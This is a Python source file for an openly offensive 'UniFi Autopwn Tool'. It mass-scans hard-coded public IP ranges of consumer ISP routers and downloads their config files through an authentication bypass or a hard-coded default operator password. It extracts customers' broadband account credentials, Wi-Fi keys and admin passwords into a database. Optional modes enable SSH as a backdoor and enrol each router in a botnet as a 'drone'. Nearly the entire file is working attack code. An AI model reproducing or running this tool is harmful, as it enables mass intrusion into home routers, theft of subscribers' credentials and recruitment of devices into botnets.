"""
Released under the MIT-license:

Copyright (c) 2009,2010, KLKS and RuFI0

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
"""
# UniFi Autopwn Tool
# RuFI0 and KLKS of The Sexy Kambingz
# 
# This tool scans the whole IP block of TM UniFi routers, reads in the config file,
# dumps the account details, and tries to authenticate with the stolen operator password.
# It can even enable the built-in ssh daemon as a backdoor
#

# NOTES
# Post request for authentication http://192.168.0.1/login.php {ACTION_POST="LOGIN"; LOGIN_USER="operator"; LOGIN_PASSWD="password"; login="Login+"}
# SSH backdoor
# http://192.168.0.1/tools_admin.php {ACTION_POST="1"; apply="Save+Settings"; admin_name="admin"; user_password1="**********"; user_password2="**********";
# admin_password1="**********", admin_password2="**********", rt_enable="on"; rt_enable_h="1"; rt_ipaddr="0.0.0.0"; rt_port="8080"; rt_https_port="443";
# rt_enable_ssh="on"; rt_enable_ssh_h="1"; rt_control_ipaddr="0.0.0.0"; rt_control_port="22"; rt_enable_telnet_h="0"}
# We also need to send the request below right after. It saves and commits the changes
# URL=http://110.159.149.0:8080/tools_admin.xgi?random_num=2010.11.4.18.42.34&exeshell=submit%20COMMIT&exeshell=submit%20REMOTE
#
# CHANGELOG
# 
# Version 1.5 - KLKS
# Added SQLite support
#
# Version 1.4 - RuFI0
# Added code to automatically detect the corret SSID of the router
# Fixed variable reference errors
# Fixed firmware distinction between old firmware and new firmware
#
# Version 1.3 - KLKS
# Remove config delete option. Config files will now be stored instead of getting deleted.
#
# Version 1.2 - KLKS
# Re-wrote HTTP 200 and 302 response parsing.
# Moved the pwnz code into the main thread
# 
# Version 1.1 - RuFI0
# The new dlink firmware fixed the config.bin authentication bypass flaw by redirecting requests to the login page with a 302 response.
# Added new code to handle the 302 redirects and bypassed the fix by authenticating with the default operator password (operator / h566UniFi).
# Added code to automatically find the wireless key.
# Added code to automatically find the magic marker of the GZIP data in the config.bin and base64 decode the value.

import sys
import getopt
import re
import httplib
import urllib
import gzip
import os
import socket
import subprocess
import base64
import thread
import apsw
import datetime
from threading import Thread
from Queue import Queue
from time import localtime
from httplib import HTTPException
from time import sleep

#DB Schema
#login,pass,ssid,ssid_key,op_pass,mgmt_url

script_version = "UniPwn v1.4 (7 July 2011)"

oldPython = False
if sys.version_info[:2] == (2, 5):
	oldPython = True
	
httpTimeout = 20
enableBackdoor = 0
enableBot = 0
configbin_path = "configs/"

#Used for SQLite
dbConn = None
dbCurr = None
sqlLock = None

#Used for threading
ip_queue = None
printLock = None

def dir615_connect(targetIP, port):
	global oldPython, httpTimeout
	conn = None
	try:
		if oldPython:
			socket.setdefaulttimeout(httpTimeout)
			conn = httplib.HTTPConnection(targetIP, port)
		else:
			conn = httplib.HTTPConnection(targetIP, port, timeout=httpTimeout)	
	except:
		return None
	return conn
	
def dir615_commit(conn, action=1):
	# action = 1 - Enable/disable SSH
	# action = 2 - Save DDNS settings
	random_number = "%s.%s.%s.%s.%s.%s" % localtime()[0:6]
	headers = {"User-Agent":"autoPwn",
				"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				"Accept-Encoding":"gzip,deflate"}
	try:
		if action == 1:
			conn.request("GET", "/tools_admin.xgi?random_num="+random_number+"&exeshell=submit%20COMMIT&exeshell=submit%20REMOTE", headers=headers)
		else:
			conn.request("GET", "/tools_admin.xgi?random_num="+random_number+"&exeshell=submit%20COMMIT&exeshell=submit%20DDNS", headers=headers)
		httpRes = conn.getresponse()
		data = httpRes.read()
		conn.close()
		return 1
	except:
		conn.close()
		return -1
		
def dir615_login(targetIP, port, opPass):
	#Returns (conn, pLog)
	
	pLog = "Authenticating as 'operator'\n"
	conn = dir615_connect(targetIP, port)
	if conn == None:
		pLog += "Connection refused on port " + str(port) + "\n"
		return (None, pLog)
		
	params = urllib.urlencode({'ACTION_POST':'LOGIN', 'LOGIN_USER':'operator', 'LOGIN_PASSWD':opPass, 'login':'Login+'})
	headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/plain"}
	try:
		conn.request("POST", "/login.php", params, headers)
		httpRes = conn.getresponse()
		pLog += "Response: %s %s\n" % (httpRes.status, httpRes.reason)
		data = httpRes.read()
	except:
		pLog += "dir615_login() Unexpected response, skipping...\n"
		conn.close()
		return (None, pLog)
		
	#print data
	m = re.search("<META\s+HTTP-EQUIV=Refresh\s+CONTENT=\'0;\s+url=index.php\'>", data)
	if m:
		pLog += "Authentication successful\n"
		return (conn, pLog)
	else:
		pLog += "Authentication failed\n"
		conn.close()
		return (None, pLog)
	
def dir615_getConfig(targetIP,port):
	#Returns (exitStatus, pLog, data,data,data,data)
	new_firmware = 0
	
	pLog = ""
	headers = {"Content-type": "application/x-www-form-urlencode",
				"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				"Accept-Encoding":"gzip,deflate"}
			
	# Establish a connection and download the config.bin file
	conn = dir615_connect(targetIP, port)
	if conn == None:
		return (-1, "Connection refused on port " + str(port) + "\n")
		
	try:
		conn.request("GET", "/config.bin", "", headers)
		httpRes = conn.getresponse()
		pLog += "Response: %s %s\n" % (httpRes.status, httpRes.reason)
		if (httpRes.status == 200):
			pLog += "Connection returned 200...\n"
			data = httpRes.read()
			conn.close()
		elif (httpRes.status == 302):
			conn.close()
			pLog += "HTTP 302 redirect detected, trying default operator password\n"
			ret = dir615_login(targetIP, port, "h566UniFi")
			pLog += ret[1]
			if ret[0] == None:
				printLog(pLog)
				return (-1, pLog)
			conn = ret[0]
			conn.request("GET", "/config.bin", "", headers)
			httpRes = conn.getresponse()
			if (httpRes.status != 200):
				pLog += "Unfavourable response...\n"
			pLog += "Response: %s %s\n" % (httpRes.status, httpRes.reason)
			new_firmware = 1
			data = httpRes.read()
		else:
			conn.close()
			pLog += "Unknown response : Server returned %d\n" % (httpRes.status,)
			return (-1, pLog)		
	except:
		conn.close()
		pLog += "Unexpected response, skipping...\n"
		return (-1, pLog)
	
	# Decrypt the config.bin to dump passwords
	pLog += "config.bin filesize: %s\n" % (len(data))
	config = open(configbin_path+'config.bin-'+targetIP, 'wb')
	
	magic_marker = data.find("\x1f\x8b")
	if (magic_marker == -1):
		conn.close()
		config.write(data)
		config.close()
		pLog += "Not vulnerable, skipping...\n"
		return (-1, pLog)
		
	config.write(data[magic_marker:])
	config.close()
	
	try:
		config = gzip.open(configbin_path+'config.bin-'+targetIP, 'rb')
		if (new_firmware == 1):
			content = base64.b64decode(config.read())
		else:
			content = config.read()
		config.close()
	except:
		config.close()
		pLog += "Not vulnerable, skipping...\n"
		#os.remove('config.bin-'+targetIP)
		return (-1, pLog)
	#os.remove('config.bin-'+targetIP)
	
	# Search for the operator password in the config file
	m = re.search('<name>operator<\/name>\s*<password>(.*)<\/password>', content)
	opPass = ""
	if m:
		opPass = m.group(1)
		pLog += "Operator password: %s\n" % (opPass)
			
	# Grab target's Unifi account details
	m = re.search('<pppoe>\s*<mode>.*<\/mode>\s*<staticip>.*<\/staticip>\s*<user>(.*)<\/user>\s*<password>(.*)<\/password>', content)
	unifiUser = ""
	unifiPass = ""
	if m:
		unifiUser = m.group(1)
		unifiPass = m.group(2)
		pLog += "UniFi Username: %s\n" % (unifiUser)
		pLog += "UniFi Password: %s\n" % (unifiPass)

	# Grab wireless details
	m = re.findall('<ssid>(.*)<\/ssid>', content)
	wifiSSID = ""
	if m:
		if m[2] == "" or m[2] == "Dlink":
			wifiSSID = "WIRELESS_DISABLED"
		else:
			wifiSSID = m[2]
		#for s in m:
		#	if (s != '' or s.lower() != "dlink"):
		#		wifiSSID = s
				
		pLog += "Wireless SSID: %s\n" % (wifiSSID)
	
	m = re.findall('<key\s*.*>(.*)<\/key>', content)
	wifiKey = ""
	if m:
		count = 1
		wifiKey = "NOT_FOUND"
		for s in m:
			if s != "":
				wifiKey = s

		pLog += "Wireless Key: %s\n" % (wifiKey)
		
	return (0, pLog, unifiUser, unifiPass, wifiSSID, wifiKey, opPass)
	
def pwn_dir615(targetIP, port):
	global enableBackdoor, httpTimeout, oldPython, enableBot
	
	opPass = ""
	unifiUser = ""
	pLog = ""
	myssh = None
	
	pLog = "\nTrying http://"+targetIP+":" + str(port) + "\n"
	ret = dir615_getConfig(targetIP,port)
	if ret[0] != 0:
		pLog += ret[1]
		printLog(pLog)
		return
	else:
		pLog += ret[1]
		opPass = ret[6]
		unifiUser = ret[2]
		dbLog(ret[2],ret[3],ret[4],ret[5],ret[6],targetIP,port)
		Log("%s,%s,%s,%s,%s,%s:%d" % (ret[2],ret[3],ret[4],ret[5],ret[6],targetIP,port))
		if enableBackdoor == 0:
			printLog(pLog)
	
	# Backdoor the bitch
	if (enableBackdoor != 0):
		# Authenticate with the router	
		ret = dir615_login(targetIP, port, opPass)
		pLog += ret[1]
		if ret[0] == None:
			printLog(pLog)
			return	
		conn = ret[0]
		
		enableSSH_status = 0
		commitSSH_status = 0
		pLog += "Enabling SSH\n"
		params = urllib.urlencode({"ACTION_POST":'1', "apply":"Save+Settings", "admin_name":"admin", "user_password1":"**********", "user_password2":"**********",
									"admin_password1":"**********", "admin_password2":"**********", "rt_enable":"on", "rt_enable_h":"1", "rt_ipaddr":"0.0.0.0", 
									"rt_port":"8080", "rt_https_port":"443", "rt_enable_ssh":"on", "rt_enable_ssh_h":"1", "rt_control_ipaddr":"0.0.0.0",
									"rt_control_port":"22", "rt_enable_telnet_h":"0"})
		headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/plain"}
		try:
			conn.request("POST", "/tools_admin.php", params, headers)
			httpRes = conn.getresponse()
			pLog += "Response: %s %s\n" % (httpRes.status, httpRes.reason)
			data = httpRes.read()
			enableSSH_status = 1
		except:
			pLog += "Enabling SSH Failed...\n"
			printLog(pLog)
			return

		# Tell the router to COMMIT changes
		conn.close()
		ctr = 0
		commit_success = 0
		while ctr != 3:
			sleep(1)
			pLog += "Committing  SSH changes\n"
			conn = dir615_connect(targetIP, port)
			if conn == None:
				pLog += "Connection refused on port " + str(port) + "\n"
				printLog(pLog)
				ctr += 1
				continue
			
			# Commit changes
			commitSSH_status = dir615_commit(conn, 1)
			if commitSSH_status != 1:
				pLog += "Commit may have failed...\n"
				ctr += 1
				conn.close()
				continue
			else:
				commit_success =  1
				break
	
		if commit_success != 1:
			printLog(pLog)
			return
			
		if (commitSSH_status == 1 and enableBot == 1):
			pLog += "Turning router into a uniBot drone\n"
			enableDDNS_status = 0
			ssh_status = 0
			rgdb_stats = 0
			botname = unifiUser.replace('@', '_')
			if commitSSH_status == 1:
				# Authenticate with the router
				conn = dir615_connect(targetIP, port)
				if conn == None:
					pLog += "Connection refused on port " + str(port) + "\n"
					printLog(pLog)
					return
								
				if sys.platform != "win32":
					enableDDNS_status = os.WEXITSTATUS(os.system("python unibot_install.py %s %s %s" % (targetIP, opPass, botname)))
				else:
					enableDDNS_status = subprocess.call("python unibot_install.py %s %s %s" % (targetIP, opPass, botname))					

				if enableDDNS_status == 1:
					pLog += "Committing DDNS settings\n"
					dir615_commit(conn, 2)
					pLog += "uniBot setup done\n"
					pLog += "Drone name: %s\n" % (botname)
				elif enableDDNS_status == 0:
					pLog += "uniBot setup failed. (SSH error)\n"
				elif enableDDNS_status == 2:
					pLog += "uniBot setup failed. (DDNS error)\n"
				else:
					pLog += "uniBot setup failed. (Unknown error)\n"
					
				if enableDDNS_status != 1:
					printLog(pLog)
					return
					
				# We're nice, we'll close back the ssh port after using it
				ctr = 0
				while ctr != 3:
					sleep(1)
					pLog += "Disabling SSH service\n"
					conn = dir615_connect(targetIP, port)
					if conn == None:
						pLog += "Connection refused on port " + str(port) + "\n"
						printLog(pLog)
						ctr += 1
						continue
					
					# Commit changes
					pLog += "Committing  SSH changes\n"
					commitSSH_status = dir615_commit(conn, 1)
					if commitSSH_status != 1:
						pLog += "Commit may have failed...\n"
						ctr += 1
						conn.close()
						continue
					else:
						break
				printLog(pLog)

def printLog(string):
	global printLock
	printLock.acquire()
	print string
	printLock.release()

def dbLog(unifiUser, unifiPass, wifiSSID, wifiKey, opPass, targetIP, port):
	global sqlLock,dbConn, dbCurr
	sqlLock.acquire()
	if dbConn == None:
		sqlLock.release()
		return
	admin_url = targetIP+port
	last_seen = datetime.datetime.now().strftime("%Y-%m-%d")
	
	#Check if an existing entry exists
	sql_query = "SELECT count(username) FROM accounts WHERE username=?;"
	bExists = False
	for cnt in dbCurr.execute(sql_query, (unifiUser,)):
		if cnt[0] != 0:
			bExists = True
		break
	if bExists: #Update information
		sql_query = "UPDATE accounts SET password=?,wifissid=?,wifikey=?,op_pass=?,admin_url=?, last_seen=? WHERE username=?"
		dbCurr.execute(sql_query, (unifiPass, wifiSSID, wifiKey, opPass, admin_url, last_seen, unifiUser))
	else: #Create a new entry
		sql_query = "INSERT INTO accounts values(?,?,?,?,?,?,?)"
		dbCurr.execute(sql_query,(unifiUser, unifiPass, wifiSSID, wifiKey, opPass, admin_url, last_seen))
	sqlLock.release()
		
def Log(msg):
	global printLock
	printLock.acquire()
	log = open("unipwn.log", 'a')
	log.write(msg + "\n")
	log.close()
	printLock.release()

def ErrorLog(msg):
	global printLock
	printLock.acquire()
	log = open("unipwn_err.log", 'a')
	log.write(msg + "\n")
	log.close()
	print msg
	printLock.release()

def PrepDB():
	global dbConn,dbCurr
	
	try:
		dbConn=apsw.Connection("unipwn.db")
	except:
		dbConn = None
		return
	
	dbCurr = dbConn.cursor()
	tblExists = False
	#Check and make sure tables exists
	for cnt in dbCurr.execute("SELECT count(name) FROM sqlite_master WHERE type='table' AND name='accounts' limit 1;"):
		if cnt[0] == 1:
			tblExists = True
		break
	if not tblExists:	#Recreate database
		dbCurr.execute("create table accounts(username,password,wifissid,wifikey,op_pass,admin_url,last_seen);")
	
# Usage
def usage():
	print \
	"""
	Example:
	python unifi-autopwn.py -n /opt/local/bin/nmap
	
	Options:
		-h, --help\t\t\t\tShow this message and exit
		-n NMAP_PATH, --nmap NMAP_PATH\t\tNmap path on localhost
		-b, --backdoor\t\t\t\tBackdoors the targets using SSH (optional)
		-t\t\t\t\t\tThreads to run (default=10, max=200)
		-u\t\t\t\t\tTurn router into a uniBot zombie
	"""

def workerThread(q):
	while True:
		ip = q.get()
		for p in (80,8080):
			pwn_dir615(ip, p)
		q.task_done()
		
def main(argv):
	global printLock, sqlLock, enableBackdoor, ip_queue, enableBot
	threadCount = 10
	nmapPath = "nmap"
	
	# Because everyone needs a cool looking banner
	print \
	"""
	UniFi Autopwn Tool -- brought to you by The Sexy Kambingz
	             petme [at] thesexykambingz.com
	"""
	
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hn:bt:u", ["help", "nmap=", "backdoor"])
	except getopt.GetoptError:
		usage()
		sys.exit(2)
		
	for opt, arg in opts:
		if opt in ("-h", "--help"):
			usage()
			sys.exit(2)
		elif opt in ("-n", "--nmap"):
			nmapPath = arg
		elif opt in ("-b", "--backdoor"):
			enableBackdoor = 1
		elif opt == "-t":
			try:
				tc = int(arg)
			except:
				print "Invalid thread count :" + a
				sys.exit(2)
			if tc > 200:
				tc = 200
			threadCount = tc
		elif opt == "-u":
			enableBot = 1
	
	#Prep DB
	PrepDB()
	
	#Acquire locks
	sqlLock = thread.allocate_lock()
	printLock = thread.allocate_lock()
	ip_queue = Queue()
	
	#Start kicking off threads
	for i in range(threadCount):
		worker = Thread(target=workerThread, args=(ip_queue,))
		worker.setDaemon(True)
		worker.start()
	
	#First_2_Octet = "1.9."
	#First_2_Octet = "112.137."	
	#First_2_Octet = "110.159."
	#First_2_Octet = "175.136."
	#First_2_Octet = "175.137."
	First_2_Octet = "210.195."
	#First_2_Octet = "175.138."
	#First_2_Octet = "175.139."
	#First_2_Octet = "49.236."
	#First_2_Octet = "175.142."
	#First_2_Octet = "175.143."
	for trdO in range(0,255):
		# Scan subnet with nmap
		ip = First_2_Octet + str(trdO) + ".1/24"
		print "---Scanning on '%s'---" % (ip)
		
		#Delete unifi-targets.gnmap
		if os.path.isfile("unifi-targets.gnmap"):
			os.remove("unifi-targets.gnmap")
			
		nmap_cmd = nmapPath + " -n -sP -oG unifi-targets.gnmap " + ip
		if sys.platform not in ("win32", "cygwin"):
			nmap_cmd = nmap_cmd + " > /dev/null"
			
		os.system(nmap_cmd)
		f = open("unifi-targets.gnmap", "r")
		live_systems = f.readlines()
		f.close()

		for ls in live_systems:
			x = ls.split()
			if (x[4] == 'Up'):
				ip_queue.put(x[1])

		ip_queue.join()
		print "--- END (%s)---\n" % (ip)
		dbConn.close()
		
if __name__ == "__main__":
	main(sys.argv[1:])
